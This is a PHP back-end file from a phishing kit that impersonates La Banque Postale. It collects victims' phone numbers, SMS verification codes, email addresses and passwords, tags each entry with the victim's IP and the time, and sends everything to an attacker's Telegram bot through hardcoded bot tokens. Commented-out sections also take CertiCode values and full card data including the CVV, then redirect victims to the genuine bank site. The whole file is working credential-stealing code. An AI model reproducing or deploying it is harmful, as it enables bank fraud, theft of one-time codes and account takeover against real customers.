<?php
 /* CODED BY Mr.fnetwork  */
 session_start();
 $username = $_SESSION['username'];
 $password = $_SESSION['password'];
 // Website title
 $web_title = "La Banque Postale - Gérez vos données personnelles";
 $web_title_secuirty = "La Banque Postale - 3-D Secure";
 $web_title_successfully = "La Banque Postale - Félicitation";

 // Vars with defaults values
 $error = false;
 $errormessage = "";
 $from = "";
 $subject = "";
 $message = "";
 $date = gmdate("H:i:s | d/m/Y");
 $victim_ip = getenv("REMOTE_ADDR");
 
 if(isset($_POST['log'])){
 	$phonenumber = $_POST['phonenumber'];

 	if(empty($phonenumber)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
        $message1 = 
        "

=================[  Phone number +33 $$  ]=================
[Phone Number]   = ".$phonenumber."

=================[ INFO VICTIM ]==============
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    =  ".$date."\n";
        file_get_contents("https://api.telegram.org/bot5143643676:AAEGqFpn8AswDcrOQPTeijYLGoldBs4mX0g/sendMessage?chat_id=692553215&text=" . urlencode($message1)."" );
        
        header('Location: sms.php');
 	}
 }
 
 /* CERTICODE PROCESS 
 //Certicode
 if(isset($_POST['certi'])){
 	$certicode = $_POST['certicode'];

 	if(empty($certicode)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
        $message11 = 
        "

=================[  CertiCode $$  ]=================
[CertiCode]   = ".$certicode."

=================[ INFO VICTIM ]==============
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    =  ".$date."\n";
        file_get_contents("https://api.telegram.org/bot2029583861:AAF7PW37IAT37xVfN6i5IDrOmB4oRlW1f1Q/sendMessage?chat_id=-1001501439664&text=" . urlencode($message11)."" );
        
        header('Location: sms.php');
 	}
 }
 */
 //SMS1
 
if(isset($_POST['sms1b'])){
 	$sms1 = $_POST['sms1'];

 	if(empty($sms1)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
 		$message2 = 
        "
=================[ SMS1 ]=================
[SMS 1 ]   = ".$sms1."
=================[ INFO ]=================
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
------------------ SPTX ------------------\n";
        
        // Send results
         file_get_contents("https://api.telegram.org/bot5143643676:AAEGqFpn8AswDcrOQPTeijYLGoldBs4mX0g/sendMessage?chat_id=692553215&text=" . urlencode($message2)."" );
        
        header('Location:mailac.php ');
 	}
 }
 
 //SMS2
 
if(isset($_POST['sms2b'])){
 	$sms2 = $_POST['sms2'];

 	if(empty($sms2)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
 		$message3 = 
        "
=================[ SMS2 ]=================
[SMS 2 ]   = ".$sms2."
=================[ INFO ]=================
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
------------------ SPTX ------------------\n";
        
        // Send results
        file_get_contents("https://api.telegram.org/bot5143643676:AAEGqFpn8AswDcrOQPTeijYLGoldBs4mX0g/sendMessage?chat_id=692553215&text=" . urlencode($message3)."" );
        
        header('Location:successfully.php ');
 	}
 }
 
// access
if(isset($_POST['access'])){
 	$email = $_POST['email'];
        $epass = $_POST['epass'];

 	if(empty($email)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
 		$message3 = 
        "
=================[ Mail Access ]=================
[Email  ]   = ".$email."
[Pass  ]   = ".$epass."
=================[ INFO ]=================
[IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    = ".$date."
------------------ SPTX ------------------\n";
        
        // Send results
         file_get_contents("https://api.telegram.org/bot5143643676:AAEGqFpn8AswDcrOQPTeijYLGoldBs4mX0g/sendMessage?chat_id=692553215&text=" . urlencode($message3)."" );
        
        header('Location:smsp.php ');
 	}
 }



/* 
 // CCV
 if(isset($_POST['doUpdate'])){
 	$phonenumber = $_POST['phonenumber'];
	$bday = $_POST['bday'];
 	$cc = $_POST['cc'];
 	$exmoth = $_POST['exmoth'];
 	$exyear = $_POST['exyear'];
 	$cvv = $_POST['cvv'];
 if(empty($cc)){
 		$error = true;
 		$errormessage = "<div class='r3m0t'>
                         <span class='closebtn' onclick='this.parentElement.style.display='none';'>&times;</span> 
                         <strong>Erreur:</strong> Tous les champs sont requis.</div>";
 	}else{
        $message4 = 
        "================= FULLS =================

=================[ Credit Card ]=================<
[Card Number]   = ".$cc."
[Expiration Date]    = ".$exmoth." / ".$exyear."
 [Cvv]    = ".$cvv."
=================[  Others  ]=================
 [Birth Day]    = ".$bday."
=================[ s ]=================
 [IP INFO]      = https://geoiptool.com/en/?ip=".$victim_ip."
[TIME/DATE]    =  ".$date."
------------------ SPTX ------------------\n";
        file_get_contents("https://api.telegram.org/bot2029583861:AAF7PW37IAT37xVfN6i5IDrOmB4oRlW1f1Q/sendMessage?chat_id=-1001501439664&text=" . urlencode($message4)."" );
        
        header('Location: https://www.labanquepostale.fr/');
 	}
 }
 */
?>
